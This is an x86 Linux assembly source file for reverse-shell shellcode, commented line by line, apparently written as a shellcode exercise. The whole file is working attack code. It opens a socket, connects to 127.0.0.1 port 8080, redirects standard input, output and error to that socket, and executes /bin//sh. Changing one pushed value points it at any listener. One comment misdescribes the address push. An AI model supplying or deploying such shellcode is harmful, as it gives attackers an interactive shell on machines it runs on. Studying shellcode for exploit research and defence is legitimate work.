section .text

global _start

_start:

create_socket:
   ; Clearing registers
   xor ebx, ebx        ; zero out ebx
   mul ebx             ; zero out eax, and edx

   ; Setting up EAX and EBX
   mov al, 0x66        ; setting eax to the system call number (0x66)
   mov bl, 1           ; setting ebx to SYS_SOCKET (0x01)

   ; Setting up ECX
   push edx            ; push IPPROTO_IP (0x00) to stack
   push ebx            ; push SOCK_STREAM (0x01) to stack
   push 0x02           ; push AF_INET (0x02) to stack
   mov ecx, esp        ; move address of arguments to ecx

   ; Execute system call
   int 0x80            ; trigger system call
   mov edi, eax        ; save socket file descriptor for later

connect:
  ; Clearing registers
  xor ebx, ebx        ; zero out ebx
  mul ebx             ; zero out eax, and edx

  ; Setting up EAX and EBX
  mov al, 0x66        ; setting eax to the system call number (0x66)
  mov bl, 0x03        ; setting ebx to SYS_CONNECT (0x03)

  ; Setting up SOCKADDR struct
  ;   Setting up IP address to connect to. In this case it's localhost
  push 0x0100007f     ; pushing 0x00 to stack

  ;   Setting up port to connect to
  push word 0x901f    ; port 8080

  ;   Pushing first argument AF_INT (0x02)
  push word 0x02      ; AF_INET

  ; moving address of SOCKADDR struct to ecx
  mov ecx, esp

  ; Setting up remainder of ECX
  push 0x10           ; Pushing length of SOCKADDR to stack
  push ecx            ; pushing address of SOCKADDR to stack
  push edi            ; pushing socket file descriptor to stack
  mov ecx, esp        ; move address of arguments to ecx

  ; Execute system call
  int 0x80            ; trigger system call

redirect_output:
  ; Setting up EAX and EBX
  pop ebx             ; moving fd from stack
  xor eax, eax        ; zeroing out eax

  ; Setting up ECX
  xor ecx, ecx        ; zeroing out ecx
  mov cl, 0x02        ; moving the largest file descriptor into ecx

  ; Repeatedly duplicate the file discriptor into STDIN, OUT, and ERR
  loop:
    mov al, 0x3f      ; setting eax to the system call number(0x3f)
    int 0x80          ; execute system call
    dec ecx           ; decrease ecx to obtain each file descriptor
    jns loop          ; continue until a negative number is reached

exec_commands:
  ; Clearing registers
  xor ebx, ebx        ; zero out ebx
  mul ebx             ; zero out eax, and edx

  ; Setting up EAX
  mov al, 0x0b        ; setting eax to the system call number (0x0b)

  ; Setting up EBX
  push edx            ; pushing null byte to the stack
  push 0x68732f2f     ; pushing '//sh' to stack
  push 0x6e69622f     ; pushing '/bin' to stack
  mov ebx, esp        ; moving address of argument to ebx

  ; Setting up ECX and EDX
  mov ecx, edx        ; setting ecx to null byte (that's already in
                     ; edx)

  ; Execute system call
  int 0x80
